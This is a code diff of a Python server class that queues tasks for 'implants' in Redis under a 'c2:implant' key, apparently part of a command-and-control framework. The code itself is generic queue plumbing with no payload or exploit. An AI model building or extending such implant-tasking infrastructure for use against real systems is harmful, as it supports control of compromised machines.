@@ -18,50 +18,57 @@ import logging
 logger = logging.getLogger("server")
 
 
-class ImplantCommandService:
+class ImplantTaskService:
     """
-    An interface for  command queueing/dequeueing in redis.
-
+    An interface for task queueing/dequeueing in redis.
     """
 
     def __init__(self, agent_id: str):
         self.agent_id = agent_id
         self.queue_key = f"c2:implant:{self.agent_id}:tasks"
-
-        # Initialize Redis connection
         self.redis = get_redis_connection()
 
-    def enqueue_command(self, command: str, extra_data: dict = None) -> str:
-        """Push a command to the agent's queue."""
-        # PLACEHOLDER COMMAND - Structure TBD
+    def enqueue_task(self, task: str, extra_data: dict | None = None) -> str:
+        """Push a task to the agent's queue."""
         payload = {
             "id": str(uuid.uuid4()),
             "agent_id": self.agent_id,
-            "command": command,
-            "issued_at": datetime.utcnow().isoformat(),
+            "task": task,
+            "issued_at": datetime.utcnow().isoformat() + "Z",
             "extra_data": extra_data or {},
         }
+
         packed = msgpack.packb(payload, use_bin_type=True)
         self.redis.rpush(self.queue_key, packed)
         return payload["id"]
 
-    def dequeue_command(self) -> dict | None:
-        """Pop the next command from the agent's queue."""
-        packed = self.redis.lpop(self.queue_key)
+    # ---------- RAW (bytes) ----------
+
+    def dequeue_task(self) -> bytes | None:
+        """Pop the next task (MessagePack bytes)."""
+        return self.redis.lpop(self.queue_key)
+
+    def peek_queue(self, n: int = 10) -> list[bytes]:
+        """Peek at the next n tasks (MessagePack bytes)."""
+        return self.redis.lrange(self.queue_key, 0, n - 1)
+
+    def queue_length(self) -> int:
+        return self.redis.llen(self.queue_key)
+
+    def set_ttl(self, seconds: int):
+        self.redis.expire(self.queue_key, seconds)
+
+    # ---------- DECODED (dict) ----------
+    # Some extra function to  return tasks as a dict, for various reasons/compatability
+    # These are the exceptions, not the standard
+
+    def dequeue_task_dict(self) -> dict | None:
+        """Pop and decode the next task."""
+        packed = self.dequeue_task()
         if packed is None:
             return None
         return msgpack.unpackb(packed, raw=False)
 
-    def peek_queue(self, n: int = 10) -> list[dict]:
-        """Peek at the next n commands without removing them."""
-        packed_list = self.redis.lrange(self.queue_key, 0, n - 1)
-        return [msgpack.unpackb(p, raw=False) for p in packed_list]
-
-    def queue_length(self) -> int:
-        """Return the current length of the agent's queue."""
-        return self.redis.llen(self.queue_key)
-
-    def set_ttl(self, seconds: int):
-        """Set an expiration on the queue key."""
-        # README: Set to like 1 month by default.
-        self.redis.expire(self.queue_key, seconds)
+    def peek_queue_dict(self, n: int = 10) -> list[dict]:
+        """Peek and decode the next n tasks."""
+        return [msgpack.unpackb(p, raw=False) for p in self.peek_queue(n)]
